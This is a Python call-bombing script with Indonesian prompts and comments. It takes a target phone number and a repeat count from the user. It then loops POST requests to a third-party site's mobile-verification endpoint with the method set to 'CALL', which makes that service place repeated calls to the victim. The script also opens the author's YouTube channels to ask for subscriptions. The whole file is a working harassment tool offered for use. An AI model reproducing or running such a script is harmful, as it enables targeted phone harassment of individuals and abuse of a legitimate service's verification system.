# Mau gua Marshal kagak jadi
import os,sys,time,requests
from time import sleep

a,m,h,k,b,u,bm,p,bn,o = [
'\033[90m',
'\033[31m',
'\033[32m',
'\033[33m',
'\033[94m',
'\033[35m',
'\033[36m',
'\033[37m',
'\033[41m',
'\033[0m'
]

#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.05)

os.system('clear')
print ('\033[36;1mSubscribe yt ku ngab \033[37mMisterAM \033[36mok! :v')
os.system('termux-open-url https://youtube.com/channel/UCXk4vbvDl7i6dxWBtNdpx6w')
sleep(5)
os.system('clear')
print ('\033[36;1mSubs juga chanelnya \033[37;1myg ngasih source ngab :v')
os.system('xdg-open https://youtube.com/channel/UCRaVHUXQGVAH7Gof7kixIoQ')
sleep(3)
os.system('clear')
# Ubah Terserah kalian
banner= """

\033[31;1m ███████╗██████╗  █████╗ ███╗   ███╗ \033[31;1m ╔██████╗ █████╗ ██╗     ██╗
\033[31;1m ██╔════╝██╔══██╗██╔══██╗████╗ ████║ \033[31;1m ██╔════╝██╔══██╗██║     ██║
\033[31;1m ███████╗██████╔╝███████║██╔████╔██║ \033[31;1m ██║     ███████║██║     ██║
\033[37;1m ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║ \033[37;1m ██║     ██╔══██║██║     ██║
\033[37;1m ███████║██║     ██║  ██║██║ ╚═╝ ██║ \033[37;1m ╚██████╗██║  ██║███████╗███████╗
\033[37;1m ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝ \033[37;1m  ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝

\033[33;1m╔════════════════════════════════════════════════╗
\033[33;1m║  \033[36;1m [•] Authour : MisterAM                      \033[33;1m ║
\033[33;1m║  \033[36;1m [•] gitHub  : https:github.com/Mister-AM    \033[33;1m ║
\033[33;1m║  \033[36;1m [•] Yotube  : MisterAM                      \033[33;1m ║
\033[33;1m╚════════════════════════════════════════════════╝
\033[36;1m╔═══════════════════════════╗
\033[36;1m║\033[33;1m GUNAKAN DENGAB BJIAK NGAB\033[36;1m ║
\033[36;1m╚═══════════════════════════╝"""
sleep(1)
print(banner)
# Jaggan di ubah sayang
print ("")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
print ("")
print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh nomor\033[37m : \033[37m\033[33m8Xxx\033[33m")
nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Nomor Target\033[32m \033[37m:\033[37m\033[33m ")
print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m MASUKAN JUMLAH \033[1;33m• \033[0m\033[1;30m]══════════════>")
jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
mengetik("[KALO SUDAH LIMIT TUNGUH BEBERAPA MENIT LAGI BARU ULANGI NGAB :V] ")
time.sleep(3)
# Jaggan di ubah sayang ku
url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}
# Jaggan di ubah sayng
for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [â€¢] Status ~+> ",(send.json()["message"]))

